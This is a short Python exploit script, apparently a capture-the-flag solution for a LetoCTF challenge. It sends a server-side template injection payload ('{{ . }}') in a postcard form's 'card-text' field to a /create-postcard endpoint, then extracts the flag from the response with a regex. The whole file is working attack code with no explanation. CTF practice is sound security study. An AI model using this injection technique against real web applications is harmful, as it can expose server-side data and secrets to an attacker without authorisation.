#!/usr/bin/env python3

import requests
import sys
import re


def main():
    url = sys.argv[1]
    data = {
        'card-text': '{{ . }}',
        'card-background-image': 'whatever',
    }

    resp = requests.post(
        f'{url}/create-postcard',
        data=data
    )

    flag = re.findall(r'(LetoCTF\{.+\})', resp.text)[0]
    print(f'flag: {flag}')


if __name__ == '__main__':
    main()
